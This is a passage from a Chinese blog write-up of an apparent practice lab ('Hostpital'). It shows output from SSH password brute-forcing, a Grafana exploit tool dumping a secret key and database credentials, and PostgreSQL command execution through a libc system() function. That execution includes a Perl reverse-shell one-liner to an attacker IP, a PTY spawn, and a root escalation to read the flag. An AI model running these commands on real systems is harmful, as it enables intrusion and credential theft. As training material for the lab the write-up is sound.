class="line">[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login  </span><br><span class="line">[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台  </span><br><span class="line">[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 root root@111 ssh: handshake failed: ssh: un  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 root 1qaz2wsx ssh: handshake failed: ssh: un  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.12:22 root 1qaz!QAZ ssh: handshake failed: ssh: una  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin admin123 ssh: handshake failed: ssh: u  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin 1234567890 ssh: handshake failed: ssh:  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin 1q2w3e ssh: handshake failed: ssh: una  </span><br><span class="line">已完成 6/6  </span><br><span class="line">[*] 扫描结束,耗时: 6m48.2826514s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741514668214-ec63b5d8-59f0-4ee4-83de-5840822a6ff4.png"></p>
+<p>利用一下<a target="_blank" rel="noopener" href="https://github.com/A-D-Team/grafanaExp">https://github.com/A-D-Team/grafanaExp</a>，下载linux版本上传到受控机器上</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741515357560-ba0ada9c-6228-47e1-88ed-65bd40881103.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Target vulnerable has plugin [alertlist]</span><br><span class="line">Got secret_key [SW2YcwTIb9zpOOhoPsMm]</span><br><span class="line">There is [0] records in db.</span><br><span class="line">type:[postgres]     </span><br><span class="line">name:[PostgreSQL]               </span><br><span class="line">url:[localhost:5432]    </span><br><span class="line">user:[postgres] password[Postgres@123]  </span><br><span class="line">database:[postgres]     basic_auth_user:[] basic_auth_password:[]</span><br><span class="line">All Done, have nice day!</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><p>扫出来数据库，连接一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741516243511-ada298db-5454-4344-a318-c853060c4dc6.png"></p>
+<p>先改root密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER root WITH PASSWORD &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>此时哥斯拉弹出来的shell再监听4444端口</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518279218-e364ec43-8c0f-49b8-8f23-d5229211383b.png"></p>
+<p>弹shell，psql也可以创建函数执行命令，缺点是没回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;c&#x27; STRICT; select system(&#x27;curl 172.30.54.179&#x27;);</span><br><span class="line"></span><br><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1547/#toc_0x06-postgresql">https://tttang.com/archive/1547/#toc_0x06-postgresql</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33020901/article/details/79032774">https://blog.csdn.net/qq_33020901&#x2F;article&#x2F;details&#x2F;79032774</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518343735-e4f11c3e-e212-4173-b43b-7a24f2ca8413.png"></p>
+<p>进入交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518546759-8fd9bc77-fe72-4a2a-9946-7216fb25a4d5.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518673541-e320aa21-91d3-481f-9862-5ba4f16cb34f.png"></p>
+<p>直接连接输入 ?之后再输入!&#x2F;bin&#x2F;bash就可以到root权限了直接读flag文件</p>
+<p>flag{be4c267d-e3be-482f-b03b-45bade888421}</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518779730-556b281a-3255-4637-8203-e17cb4fee4fc.png"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">外网打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">fastjson漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">数据库提权</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&text=春秋云境-Hostpital"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&is_video=false&description=春秋云境-Hostpital"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Hostpital&body=Check out this article: https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&name=春秋云境-Hostpital&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&t=春秋云境-Hostpital"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
